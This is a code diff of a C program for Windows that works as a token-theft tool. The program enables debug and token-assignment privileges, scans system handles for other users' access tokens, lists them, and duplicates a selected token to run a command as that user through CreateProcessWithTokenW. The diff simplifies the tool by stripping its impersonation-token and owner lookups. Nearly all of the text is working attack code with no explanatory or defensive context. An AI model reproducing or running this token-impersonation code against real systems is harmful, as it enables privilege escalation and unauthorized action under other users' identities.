@@ -3,17 +3,17 @@
 #include <winternl.h>
 #pragma comment(lib, "ntdll")
 
+#define COMMAND_LENGTH 1000
+#define TOKEN_TYPE_LENGTH 30
+#define FULL_NAME_LENGTH 271
+#define OB_TYPE_INDEX_TOKEN 4
 #define MAX_USERNAME_LENGTH 256
 #define MAX_DOMAINNAME_LENGTH 15
-#define FULL_NAME_LENGTH 271
-#define TOKEN_TYPE_LENGTH 30
-#define COMMAND_LENGTH 1000
-#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L)
-#define STATUS_INFO_LENGTH_MISMATCH             ((NTSTATUS)0xC0000004L)
-#define STATUS_BUFFER_OVERFLOW                  ((NTSTATUS)0x80000005L)
-#define SystemHandleInformation                 16
-#define SystemHandleInformationSize             1024 * 1024 * 10
-#define OB_TYPE_INDEX_TOKEN 4
+#define SystemHandleInformation 16
+#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+#define SystemHandleInformationSize 1024 * 1024 * 10
+#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
+#define STATUS_BUFFER_OVERFLOW ((NTSTATUS)0x80000005L)
 
 typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
     USHORT ProcessId;
@@ -94,11 +94,8 @@ typedef struct {
     BOOL valid;
     int token_id;
     HANDLE token_handle;
-    wchar_t owner_name[FULL_NAME_LENGTH];
     wchar_t user_name[FULL_NAME_LENGTH];
-    wchar_t TokenType[50];
-    wchar_t TokenImpersonationLevel[100];
-}TOKEN;
+} TOKEN;
 
 void duplicate_and_launch(HANDLE token, wchar_t* command) {
     HANDLE duplicated_token;
@@ -114,117 +111,33 @@ void duplicate_and_launch(HANDLE token, wchar_t* command) {
     PROCESS_INFORMATION pi = {};
     si.dwFlags |= STARTF_USESTDHANDLES;
     si.hStdInput = NULL;
-    si.hStdError = fileHandle;
-    si.hStdOutput = fileHandle;
+    si.hStdError = si.hStdOutput = fileHandle;
 
     if (DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicated_token) != 0){
         CreateProcessWithTokenW(duplicated_token, NULL, NULL, command, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
         WaitForSingleObject(pi.hProcess, INFINITE);
         CloseHandle(duplicated_token);
     }
-    else {
-        printf("Duplication failed (%d)... Exiting\n", GetLastError());
-        exit(0);
-    }
     CloseHandle(fileHandle);
+    return;
 }
 
-wchar_t* get_token_owner_info(HANDLE token) {
-    wchar_t username[MAX_USERNAME_LENGTH], domain[MAX_DOMAINNAME_LENGTH], full_name[FULL_NAME_LENGTH];
-    SID_NAME_USE sid;
-    DWORD user_length = sizeof(username), domain_length = sizeof(domain), token_info;
-    if (!GetTokenInformation(token, TokenOwner, NULL, 0, &token_info)) {
-        PTOKEN_OWNER TokenStatisticsInformation = (PTOKEN_OWNER)GlobalAlloc(GPTR, token_info);
-        if (GetTokenInformation(token, TokenOwner, TokenStatisticsInformation, token_info, &token_info)) {
-            LookupAccountSidW(NULL, ((TOKEN_OWNER*)TokenStatisticsInformation)->Owner, username, &user_length, domain, &domain_length, &sid);
-            _snwprintf_s(full_name, FULL_NAME_LENGTH, L"%ws/%ws", domain, username);
-            return full_name;
-        }
-    }
-}
-
-wchar_t* get_token_user_info(HANDLE token) {
-    wchar_t username[MAX_USERNAME_LENGTH], domain[MAX_DOMAINNAME_LENGTH], full_name[FULL_NAME_LENGTH];
-    DWORD user_length = sizeof(username), domain_length = sizeof(domain), token_info;
-    SID_NAME_USE sid;
-    if (!GetTokenInformation(token, TokenUser, NULL, 0, &token_info)) {
-        PTOKEN_USER TokenStatisticsInformation = (PTOKEN_USER)GlobalAlloc(GPTR, token_info);
-        if (GetTokenInformation(token, TokenUser, TokenStatisticsInformation, token_info, &token_info)) {
-            LookupAccountSidW(NULL, ((TOKEN_USER*)TokenStatisticsInformation)->User.Sid, username, &user_length, domain, &domain_length, &sid);
-            _snwprintf_s(full_name, FULL_NAME_LENGTH, L"%ws/%ws", domain, username);
-            return full_name;
-        }
-    }
-}
-
-TOKEN* is_impersonate_token(TOKEN* TOKEN_INFO) {
-    DWORD returned_tokinfo_length, returned_tokimp_length;
-    if (!GetTokenInformation(TOKEN_INFO->token_handle, TokenStatistics, NULL, 0, &returned_tokinfo_length)) {
-        PTOKEN_STATISTICS TokenStatisticsInformation = (PTOKEN_STATISTICS)GlobalAlloc(GPTR, returned_tokinfo_length);
-        if (GetTokenInformation(TOKEN_INFO->token_handle, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length)) {
-            if (TokenStatisticsInformation->TokenType == TokenImpersonation) {
-                wcscpy_s(TOKEN_INFO->TokenType, TOKEN_TYPE_LENGTH, L"TokenImpersonation");
-                wchar_t* token_owner;
-                token_owner = get_token_owner_info(TOKEN_INFO->token_handle);
-                wcscpy_s(TOKEN_INFO->owner_name, FULL_NAME_LENGTH, token_owner);
-                wchar_t* token_user;
-                token_user = get_token_user_info(TOKEN_INFO->token_handle);
-                wcscpy_s(TOKEN_INFO->user_name, FULL_NAME_LENGTH, token_user);
-                if (!GetTokenInformation(TOKEN_INFO->token_handle, TokenImpersonationLevel, NULL, 0, &returned_tokimp_length)) {
-                    PSECURITY_IMPERSONATION_LEVEL TokenImpersonationInformation = (PSECURITY_IMPERSONATION_LEVEL)GlobalAlloc(GPTR, returned_tokimp_length);
-                    if (GetTokenInformation(TOKEN_INFO->token_handle, TokenImpersonationLevel, TokenImpersonationInformation, returned_tokimp_length, &returned_tokimp_length)) {
-                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) >= SecurityImpersonation) {
-                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityImpersonation");
-                        }
-                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityDelegation) {
-                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityDelegation");
-                        }
-                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityAnonymous) {
-                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityAnonymous");
-                        }
-                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityIdentification) {
-                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityIdentification");
-                        }
-                    }
-                    TOKEN_INFO->valid = 0;
-                    return TOKEN_INFO;
-                } 
-            }
-        }
-    }
-    return TOKEN_INFO;
-}
 TOKEN* is_primary_token(TOKEN* TOKEN_INFO) {
-    DWORD returned_tokinfo_length, returned_tokimp_length;
+    DWORD returned_tokinfo_length;
     if (!GetTokenInformation(TOKEN_INFO->token_handle, TokenStatistics, NULL, 0, &returned_tokinfo_length)) {
         PTOKEN_STATISTICS TokenStatisticsInformation = (PTOKEN_STATISTICS)GlobalAlloc(GPTR, returned_tokinfo_length);
         if (GetTokenInformation(TOKEN_INFO->token_handle, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length)) {
             if (TokenStatisticsInformation->TokenType == TokenPrimary) {
-                wcscpy_s(TOKEN_INFO->TokenType, TOKEN_TYPE_LENGTH, L"TokenPrimary");
-                wchar_t* token_owner;
-                token_owner = get_token_owner_info(TOKEN_INFO->token_handle);
-                wcscpy_s(TOKEN_INFO->owner_name, FULL_NAME_LENGTH, token_owner);
-                wchar_t* token_user;
-                token_user = get_token_user_info(TOKEN_INFO->token_handle);
-                wcscpy_s(TOKEN_INFO->user_name, FULL_NAME_LENGTH, token_user);
-                if (!GetTokenInformation(TOKEN_INFO->token_handle, TokenImpersonationLevel, NULL, 0, &returned_tokimp_length)) {
-                    PSECURITY_IMPERSONATION_LEVEL TokenImpersonationInformation = (PSECURITY_IMPERSONATION_LEVEL)GlobalAlloc(GPTR, returned_tokimp_length);
-                    if (GetTokenInformation(TOKEN_INFO->token_handle, TokenImpersonationLevel, TokenImpersonationInformation, returned_tokimp_length, &returned_tokimp_length)) {
-                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) >= SecurityImpersonation) {
-                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityImpersonation");
-                        }
-                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityDelegation) {
-                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityDelegation");
-                        }
-                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityAnonymous) {
-                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityAnonymous");
-                        }
-                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityIdentification) {
-                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityIdentification");
-                        }
+                wchar_t username[MAX_USERNAME_LENGTH], domain[MAX_DOMAINNAME_LENGTH];
+                DWORD user_length = sizeof(username), domain_length = sizeof(domain), token_info;
+                SID_NAME_USE sid;
+                if (!GetTokenInformation(TOKEN_INFO->token_handle, TokenUser, NULL, 0, &token_info)) {
+                    PTOKEN_USER TokenStatisticsInformation = (PTOKEN_USER)GlobalAlloc(GPTR, token_info);
+                    if (GetTokenInformation(TOKEN_INFO->token_handle, TokenUser, TokenStatisticsInformation, token_info, &token_info)) {
+                        LookupAccountSidW(NULL, ((TOKEN_USER*)TokenStatisticsInformation)->User.Sid, username, &user_length, domain, &domain_length, &sid);
+                        _snwprintf_s(TOKEN_INFO->user_name, FULL_NAME_LENGTH, L"%ws/%ws", domain, username);;
+                        TOKEN_INFO->valid = 0;
                     }
-                    TOKEN_INFO->valid = 0;
-                    return TOKEN_INFO;
                 }
             }
         }
@@ -251,11 +164,8 @@ LPWSTR GetObjectInfo(HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass){
 }
 
 int wmain(int argc, wchar_t* argv[]) {
-    HANDLE hProcess;
-    HANDLE hToken;
-    LUID luidSeDebugPrivivilege;
-    LUID luidSeAssignPrimaryTokenPrivilege;
-    LUID luidSeIncreaseQuotaPrivilege;
+    HANDLE hProcess, hToken;
+    LUID luidSeDebugPrivivilege, luidSeAssignPrimaryTokenPrivilege, luidSeIncreaseQuotaPrivilege;
     TOKEN_PRIVILEGES tp;
 
     hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
@@ -318,13 +228,11 @@ int wmain(int argc, wchar_t* argv[]) {
         TOKEN_INFO.valid = 1;
         TOKEN_INFO.token_handle = dupHandle;
         is_primary_token(&TOKEN_INFO);
-        is_impersonate_token(&TOKEN_INFO);
         
         if (TOKEN_INFO.valid == 0) {
-
             int is_new_token = 0;
             for (int j = 0; j <= nbrsfoundtokens; j++) {
-                if (wcscmp(found_tokens[j].user_name, TOKEN_INFO.user_name) == 0 && wcscmp(found_tokens[j].TokenType, TOKEN_INFO.TokenType) == 0 && wcscmp(found_tokens[j].TokenImpersonationLevel, TOKEN_INFO.TokenImpersonationLevel) == 0) {
+                if (wcscmp(found_tokens[j].user_name, TOKEN_INFO.user_name) == 0) {
                     is_new_token = 1;
                 }
             }
@@ -340,12 +248,11 @@ int wmain(int argc, wchar_t* argv[]) {
 
     if (argc != 3) {
         for (int k = 0; k < nbrsfoundtokens; k++) {
-            printf("%d %ws %ws\n", found_tokens[k].token_id, found_tokens[k].TokenType, found_tokens[k].user_name);
+            printf("%d %ws\n", found_tokens[k].token_id, found_tokens[k].user_name);
         }
     }
 
     if (argc == 3) {
-        wchar_t command[COMMAND_LENGTH];
         int selected_token = _wtoi(argv[1]);
         for (int k = 0; k < nbrsfoundtokens; k++) {
             if (found_tokens[k].token_id == selected_token) {
